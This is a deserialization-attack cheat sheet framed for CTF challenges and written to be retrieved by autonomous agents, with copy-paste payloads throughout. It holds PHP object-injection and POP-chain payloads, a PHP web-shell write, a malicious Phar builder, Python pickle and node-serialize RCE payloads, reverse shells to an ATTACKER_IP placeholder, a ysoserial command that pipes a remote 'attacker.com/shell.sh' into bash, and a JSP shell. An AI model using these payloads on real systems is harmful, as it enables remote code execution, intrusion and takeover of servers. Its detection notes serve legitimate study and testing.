# Deserialization Attacks - CTF Exploitation Reference

> **Document Purpose:** Actionable deserialization attack techniques for CTF challenges. Designed for autonomous agent retrieval with copy-paste payloads, language-specific exploits, and detection methods.

---

## 1. QUICK REFERENCE: Deserialization Basics

> **When to use this section:** You suspect serialized data is being processed by the application.

### 1.1 What is Deserialization?

**Tags:** `deserialization, serialization, basics, object-injection`

**Concept:**
- Serialization: Converting objects to a storable/transmittable format
- Deserialization: Reconstructing objects from serialized data
- Vulnerability: Untrusted data deserialized without validation can execute code

**Common Serialization Formats:**
| Language | Format | Identifiers |
|----------|--------|-------------|
| PHP | serialize() | `O:4:"User":`, `a:2:{` |
| Python | pickle | `\x80\x03`, `\x80\x04`, `cos\n` |
| Java | ObjectInputStream | `aced0005` (hex), `rO0AB` (base64) |
| .NET | BinaryFormatter | `AAEAAAD/////` (base64) |
| Ruby | Marshal | `\x04\x08` |
| Node.js | node-serialize | `{"rce":"_$$ND_FUNC$$_..."}` |

**Agent Takeaway:**
- Look for serialized data in cookies, POST bodies, hidden fields
- Base64-decode suspicious data to identify format
- Each language has specific exploitation techniques

---

### 1.2 Detecting Serialized Data

**Tags:** `deserialization, detection, identification, recon`

**Where Serialized Data Appears:**
- Cookies (often base64-encoded)
- Hidden form fields
- API request/response bodies
- Session storage
- Query parameters

**Detection Patterns:**

**PHP Serialize:**
```
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}
a:2:{i:0;s:5:"hello";i:1;s:5:"world";}
```

**Python Pickle (base64):**
```
gASVGAAAAAAAAACMCF9fbWFpbl9flIwEVXNlcpSTlC4=
```

**Java Serialized (base64):**
```
rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI...
```

**Agent Takeaway:**
- Base64-decode cookies and check for serialization markers
- `O:` indicates PHP object
- `rO0AB` indicates Java
- Binary data starting with specific bytes indicates language

---

## 2. PHP DESERIALIZATION ATTACKS

> **When to use this section:** PHP application with serialized data in cookies or parameters.

### 2.1 PHP Object Injection Basics

**Tags:** `php, deserialization, object-injection, unserialize`

**The Vulnerability:**
PHP `unserialize()` on user input can trigger magic methods:
- `__destruct()` - Called when object is destroyed
- `__wakeup()` - Called on deserialization
- `__toString()` - Called when object is used as string

**Basic PHP Serialized Object:**
```php
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}
```

**Format Breakdown:**
```
O:4:"User"    - Object of class "User" (4 chars)
:2:           - Has 2 properties
{             - Properties start
s:4:"name";   - String property "name" (4 chars)
s:5:"admin";  - Value "admin" (5 chars)
s:4:"role";   - String property "role" (4 chars)
s:4:"user";   - Value "user" (4 chars)
}             - Properties end
```

**Simple Privilege Escalation:**
```php
// Original: O:4:"User":2:{s:4:"name";s:5:"guest";s:4:"role";s:4:"user";}
// Modified: O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
```

**Agent Takeaway:**
- Modify serialized property values directly
- Change role/admin/privilege values
- Maintain correct string length indicators

---

### 2.2 PHP Magic Methods Exploitation

**Tags:** `php, magic-methods, destruct, wakeup, gadget`

**Exploitable Magic Methods:**
```php
__destruct()   // Object cleanup - often calls unlink(), system()
__wakeup()     // Called on unserialize()
__toString()   // Object-to-string conversion
__call()       // Undefined method call
__get()        // Undefined property access
```

**Example Vulnerable Class:**
```php
class FileHandler {
    public $file;
    public function __destruct() {
        if (file_exists($this->file)) {
            unlink($this->file);  // Arbitrary file delete!
        }
    }
}
```

**Exploit Payload:**
```php
O:11:"FileHandler":1:{s:4:"file";s:11:"/etc/passwd";}
```

**RCE via Log Poisoning:**
```php
class Logger {
    public $file;
    public $data;
    public function __destruct() {
        file_put_contents($this->file, $this->data);
    }
}

// Payload: Write PHP shell
O:6:"Logger":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:29:"<?php system($_GET['cmd']); ?>";}
```

**Agent Takeaway:**
- Look for classes with dangerous __destruct() or __wakeup()
- Chain to file operations, system calls
- May need to enumerate available classes first

---

### 2.3 PHP POP Chains (Property Oriented Programming)

**Tags:** `php, pop-chain, gadget-chain, rce`

**Concept:**
Chain multiple classes together to achieve RCE when no single class is exploitable.

**Example POP Chain:**
```php
// Class A: Calls method on $obj in __destruct
class A {
    public $obj;
    public function __destruct() {
        $this->obj->log();
    }
}

// Class B: Calls system() in log()
class B {
    public $cmd;
    public function log() {
        system($this->cmd);
    }
}
```

**Exploit Payload:**
```php
// Chain: A->__destruct() -> B->log() -> system()
O:1:"A":1:{s:3:"obj";O:1:"B":1:{s:3:"cmd";s:2:"id";}}
```

**Python Script to Generate:**
```python
import phpserialize

class B:
    def __init__(self):
        self.cmd = "id"

class A:
    def __init__(self):
        self.obj = B()

payload = phpserialize.serialize(A())
print(payload)
```

**Agent Takeaway:**
- POP chains link multiple classes
- Look for source (entry point) and sink (dangerous function)
- May need source code or use known gadgets

---

### 2.4 PHP Phar Deserialization

**Tags:** `php, phar, deserialization, file-upload`

**The Vulnerability:**
Phar archives contain serialized metadata that gets deserialized when accessed via `phar://` stream wrapper.

**Triggering Functions:**
```php
file_exists(), file_get_contents(), include(), fopen()
file(), is_dir(), is_file(), is_link(), stat()
copy(), unlink(), rename(), readfile()
```

**Create Malicious Phar:**
```php
<?php
class Evil {
    public $cmd = "id";
    public function __destruct() {
        system($this->cmd);
    }
}

$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata(new Evil());  // Serialized here
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();
```

**Rename to Bypass Extension Filters:**
```bash
mv evil.phar evil.jpg
```

**Trigger:**
```
http://target.com/view.php?file=phar://uploads/evil.jpg/test.txt
```

**Agent Takeaway:**
- Upload phar file (may rename to .jpg, .gif)
- Trigger via any file function with `phar://` wrapper
- Payload in metadata gets deserialized

---

## 3. PYTHON PICKLE ATTACKS

> **When to use this section:** Python application processing pickle data.

### 3.1 Python Pickle RCE

**Tags:** `python, pickle, rce, unpickle, deserialization`

**The Vulnerability:**
Python `pickle.loads()` on untrusted data allows arbitrary code execution.

**Basic RCE Payload:**
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(RCE())
print(payload)  # Binary
print(payload.hex())  # Hex for debugging
```

**Base64-Encoded Payload:**
```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(RCE()))
print(payload.decode())
```

**Reverse Shell Payload:**
```python
import pickle
import base64

class ReverseShell:
    def __reduce__(self):
        import os
        cmd = "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(ReverseShell()))
print(payload.decode())
```

**Agent Takeaway:**
- Python pickle is always exploitable if you control the data
- Use `__reduce__` method to execute arbitrary code
- Common in Flask session cookies, Redis, message queues

---

### 3.2 Pickle Bypass Techniques

**Tags:** `python, pickle, bypass, sandbox, restricted`

**Alternative Payloads (No Import):**
```python
import pickle

# Using eval
class RCE:
    def __reduce__(self):
        return (eval, ("__import__('os').system('id')",))

# Using exec
class RCE2:
    def __reduce__(self):
        return (exec, ("import os; os.system('id')",))
```

**Handcrafted Pickle (Opcode Level):**
```python
import pickle

# Raw pickle opcodes for: os.system('id')
payload = b'''cos
system
(S'id'
tR.'''

print(pickle.loads(payload))  # Executes 'id'
```

**Pickle Protocol Versions:**
```python
# Different protocols may bypass filters
pickle.dumps(payload, protocol=0)  # ASCII
pickle.dumps(payload, protocol=2)  # Binary
pickle.dumps(payload, protocol=4)  # Python 3.4+
```

**Agent Takeaway:**
- Try different pickle protocols
- Raw opcodes can bypass some filters
- `eval`/`exec` as alternative to `os.system`

---

### 3.3 Flask Session Cookie Exploitation

**Tags:** `python, flask, session, cookie, pickle, itsdangerous`

**Flask Session Format:**
```
eyJ1c2VyIjoiZ3Vlc3QifQ.ZQ1234.signature
```

**Decode Flask Session:**
```python
import base64
import zlib

def decode_flask_session(cookie):
    # Split into parts
    parts = cookie.split('.')
    payload = parts[0]

    # Decode (may be compressed)
    try:
        data = base64.urlsafe_b64decode(payload + '==')
        if data[0] == ord('{'):
            return data.decode()
        return zlib.decompress(data).decode()
    except:
        return base64.urlsafe_b64decode(payload + '==')
```

**If Using Pickle Sessions (Dangerous Config):**
```python
# Some Flask apps use pickle for sessions
# Cookie may contain pickled data

import flask
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

# Create malicious session
payload = base64.b64encode(pickle.dumps({'user': RCE()}))
print(payload.decode())
```

**Flask-Unsign (If Secret Found):**
```bash
# Decode session
flask-unsign --decode --cookie "session_cookie_here"

# Crack secret
flask-unsign --unsign --cookie "session_cookie_here" --wordlist wordlist.txt

# Forge new session
flask-unsign --sign --cookie "{'user': 'admin'}" --secret "cracked_secret"
```

**Agent Takeaway:**
- Flask sessions are signed, not encrypted
- Need secret key to forge sessions
- Some configs use pickle (rare but exploitable)

---

## 4. JAVA DESERIALIZATION

> **When to use this section:** Java application with serialized objects.

### 4.1 Java Serialization Detection

**Tags:** `java, deserialization, detection, aced`

**Java Serialized Magic Bytes:**
```
Hex:    ac ed 00 05
Base64: rO0AB
```

**Detection in Headers/Cookies:**
```
Content-Type: application/x-java-serialized-object
```

**Common Locations:**
- ViewState (JSF)
- HTTP parameters (base64-encoded)
- JMX/RMI connections
- Message queues (JMS)

**Verify Java Serialized:**
```bash
echo "rO0ABXNyABF..." | base64 -d | xxd | head
# Should start with: ac ed 00 05
```

**Agent Takeaway:**
- Look for `rO0AB` prefix in base64 data
- `aced` in hex indicates Java serialization
- ViewState in JSF apps often vulnerable

---

### 4.2 Java Exploitation with ysoserial

**Tags:** `java, ysoserial, gadget-chain, rce`

**ysoserial - The Standard Tool:**
```bash
# Generate payload
java -jar ysoserial.jar CommonsCollections1 "id" > payload.bin

# Base64 encode
java -jar ysoserial.jar CommonsCollections1 "id" | base64 -w0

# Common gadget chains
CommonsCollections1-7
CommonsBeanutils1
Jdk7u21
Spring1-2
```

**Common Payloads:**
```bash
# Command execution
java -jar ysoserial.jar CommonsCollections5 "curl attacker.com/shell.sh | bash"

# DNS exfiltration (verify vulnerability)
java -jar ysoserial.jar URLDNS "http://BURP_COLLABORATOR"

# File write
java -jar ysoserial.jar FileUpload1 "write;/tmp/shell.jsp;<%=Runtime.getRuntime().exec(request.getParameter('cmd'))%>"
```

**Gadget Chain Selection:**
```
CommonsCollections1-7: Apache Commons Collections library
CommonsBeanutils1: Apache Commons BeanUtils
Spring1-2: Spring Framework
Jdk7u21: Works on JDK 7u21 and below
URLDNS: No dependencies, good for detection
```

**Agent Takeaway:**
- Use ysoserial to generate payloads
- Try URLDNS first to confirm vulnerability
- Try multiple gadget chains (depends on classpath)

---

### 4.3 Java Deserialization Without ysoserial

**Tags:** `java, deserialization, manual, gadget`

**Online Payload Generators:**
```
https://github.com/frohoff/ysoserial
https://jitpack.io/
```

**Python Alternative (with javaSerialize):**
```python
# If ysoserial not available
# Use pre-generated base64 payloads

PAYLOADS = {
    "CommonsCollections5": "rO0ABXNyADJvcmcuYXBhY2hlLmNvbW1vbnM...",
    "CommonsBeanutils1": "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ..."
}
```

**Detect Library Version:**
```
Look for error messages mentioning:
- org.apache.commons.collections
- commons-beanutils
- Spring framework version
```

**Agent Takeaway:**
- Try common gadget chains blindly
- Error messages reveal library presence
- URLDNS payload has no dependencies

---

## 5. .NET DESERIALIZATION

> **When to use this section:** .NET application with serialized data.

### 5.1 .NET Serialization Detection

**Tags:** `dotnet, deserialization, detection, viewstate`

**.NET Serialized Magic (BinaryFormatter):**
```
Base64 start: AAEAAAD/////
Hex: 00 01 00 00 00 ff ff ff ff
```

**ViewState Detection:**
```html
<input type="hidden" name="__VIEWSTATE" value="..." />
```

**ViewState Analysis:**
```bash
# Decode ViewState (if not encrypted)
echo "VIEWSTATE_VALUE" | base64 -d
```

**Agent Takeaway:**
- ViewState is common .NET serialization target
- Check if ViewState MAC is disabled
- BinaryFormatter payloads similar to Java

---

### 5.2 .NET ysoserial.net

**Tags:** `dotnet, ysoserial, gadget, rce`

**ysoserial.net - The Tool:**
```powershell
# Generate payload
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe"

# Common formatters
BinaryFormatter
SoapFormatter
LosFormatter (ViewState)
ObjectStateFormatter (ViewState)
```

**Common Gadget Chains:**
```
TypeConfuseDelegate
TextFormattingRunProperties
WindowsIdentity
ActivitySurrogateSelectorFromFile
```

**ViewState Attack (if MAC disabled):**
```powershell
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "calc.exe" --path="/vulnerable.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="KEY"
```

**Agent Takeaway:**
- Use ysoserial.net for .NET payloads
- ViewState requires machine key for signed states
- Different formatters for different contexts

---

## 6. NODE.JS DESERIALIZATION

> **When to use this section:** Node.js application with node-serialize or similar.

### 6.1 Node.js node-serialize RCE

**Tags:** `nodejs, node-serialize, rce, deserialization`

**Vulnerable Pattern:**
```javascript
var serialize = require('node-serialize');
var obj = serialize.unserialize(user_input);  // RCE!
```

**Detection:**
```json
{"rce":"_$$ND_FUNC$$_function(){...}"}
```

**RCE Payload:**
```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(error,stdout,stderr){console.log(stdout)});}()"}
```

**Reverse Shell:**
```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"')}()"}
```

**Base64-Encoded Payload:**
```python
import base64
payload = '{"rce":"_$$ND_FUNC$$_function(){require(\\'child_process\\').exec(\\'id\\');}()"}'
print(base64.b64encode(payload.encode()).decode())
```

**Agent Takeaway:**
- `_$$ND_FUNC$$_` marker indicates node-serialize
- Functions execute immediately with `()`
- Very common in CTF challenges

---

## 7. CTF-SPECIFIC STRATEGIES

> **When to use this section:** Solving deserialization challenges in CTF.

### 7.1 Deserialization CTF Playbook

**Tags:** `deserialization, ctf, playbook, workflow`

**Step 1: Identify Serialization Format**
```
1. Find suspicious data (cookies, parameters, hidden fields)
2. Base64-decode if needed
3. Check magic bytes:
   - PHP: O:, a:, s:
   - Python pickle: \x80\x03, \x80\x04
   - Java: rO0AB (base64), aced (hex)
   - .NET: AAEAAAD (base64)
   - Node.js: _$$ND_FUNC$$_
```

**Step 2: Language-Specific Exploitation**
```
PHP: Modify properties, find gadgets
Python: __reduce__ for RCE
Java: Use ysoserial
.NET: Use ysoserial.net
Node.js: node-serialize IIFE
```

**Step 3: Enumerate Available Classes (if needed)**
```
- Error messages reveal class names
- Source code if available
- Common frameworks have known gadgets
```

**Step 4: Craft and Send Payload**
```
- Base64-encode if needed
- URL-encode for GET parameters
- Set correct Content-Type for POST
```

**Agent Takeaway:**
- Identify format first
- Use language-specific tools
- Error messages are valuable

---

### 7.2 Deserialization Decision Tree

**Tags:** `deserialization, decision-tree, workflow`

```
START: Suspicious serialized data found

STEP 1: Identify format
├── Starts with O:, a:, s: → PHP
├── Contains _$$ND_FUNC$$_ → Node.js
├── Base64 starts with rO0AB → Java
├── Base64 starts with AAEAAAD → .NET
├── Binary with \x80\x03, \x80\x04 → Python pickle
└── Unknown → Try multiple approaches

STEP 2: PHP path
├── Try modifying values directly
├── Look for magic methods in source
├── Try Phar if file upload exists
└── Build POP chain if needed

STEP 3: Python path
├── Create __reduce__ payload
├── Base64-encode
└── Send in cookie/parameter

STEP 4: Java path
├── Try URLDNS for verification
├── Try common gadget chains
└── Enumerate libraries from errors

STEP 5: Node.js path
├── Craft _$$ND_FUNC$$_ payload
├── Add () for IIFE
└── Reverse shell or command exec
```

---

## 8. SUMMARY: Deserialization Quick Reference

**PHP Object Injection:**
```php
O:4:"User":1:{s:4:"role";s:5:"admin";}
```

**Python Pickle RCE:**
```python
import pickle, os, base64
class RCE:
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(RCE())))
```

**Java ysoserial:**
```bash
java -jar ysoserial.jar CommonsCollections5 "id" | base64 -w0
```

**Node.js node-serialize:**
```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
```

**Detection Magic Bytes:**
```
PHP:    O:, a:, s:
Python: \x80\x03, \x80\x04
Java:   rO0AB (b64), aced (hex)
.NET:   AAEAAAD (b64)
Node:   _$$ND_FUNC$$_
```

**Key Tools:**
```
PHP:    phpggc (gadget generator)
Java:   ysoserial
.NET:   ysoserial.net
Python: Manual __reduce__
```
